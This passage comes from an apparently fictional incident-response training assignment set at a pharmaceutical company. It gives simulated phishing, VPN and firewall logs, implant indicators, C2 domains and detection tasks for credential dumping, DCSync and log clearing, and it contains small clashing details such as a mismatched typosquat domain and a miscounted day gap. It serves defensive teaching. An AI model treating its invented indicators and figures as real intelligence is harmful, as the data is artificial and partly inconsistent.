[Available in Palo Alto NGFW traffic logs — not yet queried as of 22:30 IST investigation handover]
02:14:39  10.10.2.15 → [DESTINATION IP UNKNOWN — requires firewall query]
[Analyst must perform this query. 14-day retention — data available until Nov 20.]
```

> **Analyst action required:** Retrieve the Palo Alto firewall log for `src.ip=10.10.2.15 AND date=2024-11-06 AND time>02:00 AND time<03:00`. This will confirm whether data was exfiltrated from SERVER-RD-02 and to which IP. This is the highest-priority outstanding query.

**SERVER-FIN-01 outbound (Nov 15):**
```
21:14:55  10.10.1.20 → 203.0.113.87:443  TLS      2,891,442 out / 18,204 in  [LARGE UPLOAD ~2.8 MB]
```

### 4.9 Email and VPN Logs

**Phishing email to m.cohen (CFO):**
```
From: "Americas Licensing Team" <noreply-invoice@uslifepartner-group[.]com>
To: m.cohen@lifetechpharma.co.il
Subject: RE: Q4-2024 Licensing Agreement — Action Required
Received: 2024-11-15T17:58:44Z
Attachment: Invoice_Q4-2024_FINAL.xlsm  [142,340 bytes]
SPF: Fail  |  DKIM: None  |  DMARC: Fail
Sending IP: 198.51.100.14
```

**Phishing email to p.levi (IT Admin) — 24 days earlier:**
```
From: "IT Security Team" <it-security-noreply@lifetechpharma-corp[.]eu>
  [Note: domain is medpharma-CORP.eu — not lifetechpharma.co.il. Registered 2024-10-18.]
To: p.levi@lifetechpharma.co.il
Subject: Action Required: MFA Re-enrollment — Complete by Oct 25
Received: 2024-10-22T11:23:41Z
Attachment: mfa-enrollment-2024.html  [7,830 bytes]
SPF: Fail  |  DKIM: None  |  DMARC: None (no DMARC record on lifetechpharma-corp.eu)
Sending IP: 198.51.100.61  [different IP from CFO phishing — same /24 block]
ATP Verdict: Low Confidence Phish (SCL=4, delivered)
User action: Opened attachment at 11:31:41Z. HTML file loaded remote content.
```

> The `.html` attachment for the IT admin phishing is an **Adversary-in-the-Middle (AiTM) proxy** lure — it renders a fake Microsoft MFA page and proxies the real login, stealing the session cookie and credentials. This explains why the VPN login from Turkey at 02:17 on Oct 24 succeeded — the attacker had Paz Levi's valid session cookie and VPN credentials.

**VPN logs — p.levi:**
```
2024-10-24 02:14:53  p.levi  LOGIN  SUCCESS  IP: 77.99.xxx.xxx [Istanbul, Turkey — ASN: hosting/VPS provider]
2024-10-24 02:14:58  p.levi  CONNECTED  Duration: 01:12:44
[1 hour 12 minute VPN session from Turkey at 4 AM Rehovot time]
```

**VPN logs — m.cohen:**
```
2024-11-15 17:44:21  m.cohen  LOGIN  SUCCESS  IP: 85.215.xxx.xxx [Rehovot, IL — expected]
2024-11-15 17:44:58  m.cohen  CONNECTED
[Active session 17:44–21:22 IST]
```

### 4.10 File Indicators and Preliminary Memory Analysis

**Invoice_Q4-2024_FINAL.xlsm (CFO phishing attachment):**
```
SHA256: 9f3a1c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8
Size: 142,340 bytes
Created: 2024-11-15 17:56:02Z  [2 minutes before delivery — recently generated]
VBA macro: Present (auto-execute on open)
VirusTotal at time of analysis: 0/62  [zero detection — unknown at submission time]
```

**svchost32.exe (dropped implant — CFO host):**
```
SHA256: 2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a4
Size: 89,088 bytes
Path: C:\Users\m.cohen\AppData\Roaming\svchost32.exe
Compile timestamp: 2018-04-09 (SUSPICIOUS — likely timestomped; PE timestamp doesn't match file creation)
PE characteristics: PE32+, no digital signature, ASLR enabled, DEP enabled
Imports: WinHTTP (HTTPS capability), advapi32 (registry access), ws2_32 (sockets)
```

**UpdateHelper.dll (dropped implant — IT admin host):**
```
SHA256: 7b3f9a1c2e4d6b8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6
Size: 62,464 bytes
Path: C:\Users\p.levi\AppData\Roaming\UpdateHelper.dll
Compile timestamp: 2018-04-09  [IDENTICAL fake timestamp to svchost32.exe — strong linking indicator]
PE characteristics: DLL, no digital signature
Imports: WinHTTP, advapi32, ntdll
```

> **Critical analytical finding:** Both `svchost32.exe` (CFO host) and `UpdateHelper.dll` (IT admin host) share an **identical fake PE compile timestamp of 2018-04-09**. This is a strong indicator that both binaries were built by the same toolchain or actor, suggesting Path A and Path B are the **same threat actor** using different delivery mechanisms against the same target organization.

**Preliminary memory analysis of WS-CFO-01 (strings, automated — full analysis Saturday 08:00):**
```
Strings of interest extracted from svchost32.exe memory segment:
  - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"  [User-Agent spoofing]
  - "telemetry-cdn-services.biz"  [hard-coded C2 domain]
  - "sys-update-cdn.net"  [SECOND C2 domain — same binary knows both]
  - "/api/v2/check"  [C2 URL path]
  - "/api/v2/task"  [C2 URL path — task retrieval endpoint]
  - "BEGINDATA"  [data exfiltration marker?]
  - XOR key candidate: 0x4F  [consistent with simple single-byte XOR obfuscation]
```

> **Critical finding:** The CFO's implant (`svchost32.exe`) contains the string `sys-update-cdn.net` — the **same second C2 domain** that appeared in SERVER-RD-02's DNS logs. This means the CFO's malware is aware of the same secondary C2 that was used during the R&D server exfiltration. This strongly suggests the CFO implant and the SERVER-RD-02 operation are coordinated by the same actor — and that the actor has hard-coded a secondary C2 fallback.

### 4.11 C2 Domain and Infrastructure Analysis

**telemetry-cdn-services[.]biz:**
```
Registered: 2024-11-03  [12 days before CFO alert]
Registrar: Namecheap
Name servers: Cloudflare (proxied — hides real hosting IP)
Resolved IP: 203.0.113.87 [RFC5737 — scenario: DigitalOcean AS14061]
Cert Subject: *.telemetry-cdn-services.biz  [wildcard — supports subdomain rotation]
Cert Issued: 2024-11-03  [Let's Encrypt, same day as registration]
```

**sys-update-cdn[.]net:**
```
Registered: 2024-10-20  [33 days before CFO alert — registered before the IT admin phishing]
Registrar: Namecheap
Resolved IP: 198.51.100.44 [RFC5737 — scenario: separate VPS provider, different ASN]
Cert: Self-signed  [not Let's Encrypt — suggests different operational setup]
```

**lifetechpharma-corp[.]eu (IT admin phishing domain):**
```
Registered: 2024-10-18  [typosquat of lifetechpharma.co.il]
Used only for: AiTM phishing page delivery
No C2 function — single-use delivery infrastructure
```

**198.51.100.14 (CFO phishing email sender IP):**
```
ASN: AS12345, description: hosting/bulletproof category
Listed in: 3 public blocklists (Spamhaus SBL, BarracudaCentral, SORBS)
No public attribution to known campaigns
```

### 4.12 Public CTI Reports for Comparison

The student must independently find and study the following types of reports:

- Reports on Iranian-nexus and financially motivated groups targeting pharmaceutical and healthcare sectors in Israel and the MENA region
- Reports on AiTM (Adversary-in-the-Middle) phishing campaigns targeting corporate credentials
- Reports on groups using Excel macro→PowerShell as initial access paired with LSASS credential dumping
- Reports on campaigns using dual-track initial access (one credential-based, one malware-based against the same org)
- Public analysis of DCSync attacks and their detection in AD environments

**Suggested sources:** MITRE ATT&CK Groups, CISA advisories, Microsoft MSTIC blog, Mandiant/Google Threat Intelligence, CrowdStrike Adversary Intelligence, Secureworks CTU, INCD (Israel National Cyber Directorate) advisories, ClearSky Cyber Security research, Check Point Research.

---

## 5. Student Tasks

### A. Data Normalization and Processing

Create a structured **Evidence Table** covering all artifacts:

| Source | Timestamp (UTC) | Host | User | Observation | Reliability | Pentest? | Notes |
|---|---|---|---|---|---|---|---|
| M365 ATP | 2024-10-22 11:23 | Exchange | p.levi | AiTM phishing delivered | High | No | ... |
| Sysmon EID 1 | 2024-11-15 18:42:33 | WS-CFO-01 | m.cohen | PowerShell -Enc from Outlook | High | No | ... |
| ... | | | | | | | |

Requirements:
- Normalize all timestamps to UTC
- Include a "Pentest?" column — mark any artifact that could potentially be attributed to the CyberGuard Solutions Ltd. engagement
- Mark sources with high, medium, and low reliability
- Flag events that appear in the log gap window (Oct 22 – Nov 01 on WS-IT-LEVI)
- Identify the 3 highest-priority outstanding data collection actions

### B. Incident Timeline Construction

Build a unified chronological timeline spanning **22 October to 15 November 2024**, incorporating both Path A and Path B. For each phase:
- **Observed fact**, **assessment** (with confidence), **gap**
- Mark which events are uncertain due to the pentest contamination window

### C. IOC and IOA Extraction

**IOC Table** — minimum 12 indicators including infrastructure from both paths and both C2 domains.

**IOA Table** — minimum 8 behavioral indicators. The IOA table must address:
- The AiTM credential harvesting pattern (Path B)
- The BITS download LOLBin abuse
- The DCSync indicator (EID 4662)
- The dual-host beacon with different intervals (same C2, different timing patterns)
- The anti-forensics (log clearing, timestomping)

### D. MITRE ATT&CK Mapping

Minimum **10–14 techniques** with full fields. Mandatory coverage:
- T1566.001 (Phishing: Attachment — CFO)
- T1557 (Adversary-in-the-Middle — IT admin AiTM)
- T1059.001 (PowerShell)
- T1003.001 (LSASS Memory)
- T1547.001 (Registry Run Key)
- T1053.005 (Scheduled Task)
- T1021.003 (WMI lateral movement)
- T1003.006 (DCSync — assessed, not confirmed)
- T1070.001 (Clear Windows Event Logs)
- T1197 (BITS Jobs)
- T1027 (Obfuscated Files)
- T1071.001 (Web Protocols C2)

### E. Threat Actor / Activity Cluster Assessment

Address the following analytical questions explicitly:
1. Is Path A (CFO phishing) and Path B (IT admin AiTM) the same actor? What evidence supports or contradicts unification?
2. What does the shared PE timestamp and shared secondary C2 domain tell us?
3. What is the assessed objective: IP theft, ransomware pre-staging, or financial fraud?
4. How does the Nov 6 Korea deal data access fit into the narrative?
5. What confidence level is warranted and why?

### F. Threat Hunting Package

Minimum **6 hypotheses** addressing:
- Other hosts potentially beaconing (across 838 endpoints, only 3 are confirmed)
- AiTM credential re-use (other employees who may have received similar phishing)
- svc_backup lateral movement to hosts beyond SERVER-RD-02 and DC01
- DCSync credential re-use (if confirmed — what accounts should be treated as compromised?)

### G. Detection Engineering

Minimum **5 detections**. Mandatory:
- DET-001: Office → PowerShell ancestry (existing, validated)
- DET-002: Encoded PowerShell with stealth flags (existing, validated)
- DET-003: WmiPrvSE → PowerShell (existing, validated)
- DET-004: Scheduled Task in user dirs (existing, validated)
- **DET-005 (NEW): DCSync Detection (EID 4662 with DS-Replication-Get-Changes)**
- **DET-006 (NEW): BITS Job Download from External URL**
- **DET-007 (NEW): Security Event Log Cleared (wevtutil cl)**

### H. Detection Gap Assessment

Address the following confirmed gaps:
- Absence of PowerShell ScriptBlock logging (EID 4104) — cannot decode payload
- Absence of Sysmon on 12 research servers and DC01 — key visibility gap
- No AiTM-specific email detections (HTML attachment + remote content load from unknown domain)
- No BITS download monitoring
- Windows Security log cleared before full collection
- R&D and WSUS servers not forwarding to Splunk
- No East-West traffic inspection between R&D and corporate VLANs

---

## 6. Required Deliverables

| # | Deliverable | Audience | Format | Scope |
|---|---|---|---|---|
| D1 | Executive Summary | CISO, Board | PDF / Markdown | 1 page — includes Korea IP exfiltration assessment |
| D2 | Technical Incident Timeline (Oct 22 – Nov 15) | IR Team | Table / narrative | Full — both paths |
| D3 | Evidence Table | IR Team, SOC | Table | Complete with pentest column |
| D4 | IOC Table + IOA Table | SOC, Threat Intel | Table | Complete — both paths |
| D5 | ATT&CK Mapping Table | Detection Engineering | Table (10–14 techniques) | Complete |
| D6 | Threat Actor / Activity Cluster Assessment | CTI Lead, CISO | Narrative + table | Includes path unification analysis |
| D7 | Threat Hunting Package (6+ hypotheses) | SOC / Threat Hunting | Document | Complete |
| D8 | Detection Rules (7 rules) | Detection Engineering | Sigma YAML + SPL/KQL | Production-ready |
| D9 | Detection Gap Assessment | SOC Manager, CISO | Table + narrative | Addresses all confirmed gaps |
| D10 | Outstanding Data Collection Actions | IR Lead | Prioritized list (top 5) | Actionable |
| D11 | Confidence Statement | All | Final paragraph | Explicit uncertainty |

---

## 7. Evaluation Rubric

### Grading Scale

| Level | Criteria |
|---|---|
| **Excellent (90–100%)** | All deliverables complete, both intrusion paths addressed, pentest contamination explicitly handled, attribution discipline maintained, DCSync assessed correctly, gap assessment addresses all confirmed blind spots |
| **Good (75–89%)** | Most deliverables complete, both paths identified but unification analysis shallow, minor attribution discipline violations |
| **Weak (55–74%)** | One intrusion path missed, overclaiming attribution, detections lack tuning guidance, gap assessment generic |
| **Failing (<55%)** | Timeline incomplete, only CFO path analyzed, no attribution assessment, no gap analysis |

### Score Distribution (100 points)

| Category | Points | Criteria |
|---|---|---|
| Evidence handling | 15 | Normalization, evidence table, pentest contamination handling |
| Timeline quality | 15 | Both paths, full Oct–Nov span, explicit gaps, chronological logic |
| ATT&CK mapping accuracy | 10 | All mandatory techniques, evidence-based confidence, caveats |
| Attribution discipline | 15 | Path unification analysis, no overclaiming, explicit confidence levels |
| Threat hunting logic | 15 | Addresses both confirmed and unconfirmed scope, query logic, FP considerations |
| Detection engineering | 15 | All 7 rules, technical correctness, tuning guidance |
| Communication clarity | 10 | Executive summary explicitly addresses Korea IP exfiltration, audience separation |
| Gap analysis | 5 | Addresses all confirmed blind spots, prioritized |

---

## 8. Professional Value

This assignment reproduces the chaotic first 48 hours of a real multi-vector incident with concurrent authorized activity creating attribution noise. An analyst who successfully completes it demonstrates:

- Ability to distinguish attacker from authorized pentest activity without the pentest report
- Multi-path intrusion analysis — recognizing that two different entry points may be the same actor
- Prioritization under extreme time pressure and organizational constraint
- Evidence-based assessment of high-stakes unknowns (Korea IP exfiltration, DCSync)
- Attribution discipline when facing sophisticated obfuscation (timestomping, log clearing)

---

## 9. Common Mistakes

1. **Treating the pentest as non-issue** — failing to explicitly address artifact contamination
2. **Treating Path A and Path B as separate incidents** — missing the shared PE timestamp and C2 infrastructure
3. **Overclaiming DCSync confirmation** — EID 4662 is present but requires additional context (DS-Replication-Get-Changes may fire during legitimate replication)
4. **Missing the Korea exfiltration** — the Nov 6 SERVER-RD-02 outbound connection is the most business-critical finding
5. **Ignoring the second C2 domain** — `sys-update-cdn[.]net` only appears in the memory strings and SERVER-RD-02 DNS; missing it means missing the C2 infrastructure overlap
6. **No hunt beyond the 3 confirmed hosts** — 521 endpoints have CrowdStrike; pivoting on the C2 domain should be the first hunting action

---

## 10. Portfolio Value

This assignment demonstrates the ability to operate during a real multi-threaded incident under time pressure, with incomplete data, organizational constraints, and attribution-complicating factors. The combination of:
- Multi-vector intrusion analysis
- Pentest artifact deconfliction
- Active exfiltration with business-critical IP at stake
- Anti-forensics countermeasures
- DCSync assessment

...produces a portfolio piece that directly mirrors Senior CTI Analyst and Detection Engineer interview simulations at major technology and professional services companies.

**Recommendation:** Include D6 (Threat Actor Assessment with path unification analysis), D8 (all 7 detection rules), and D1 (Executive Summary with Korea IP exfiltration confidence statement) as the centerpiece CTI portfolio sample.
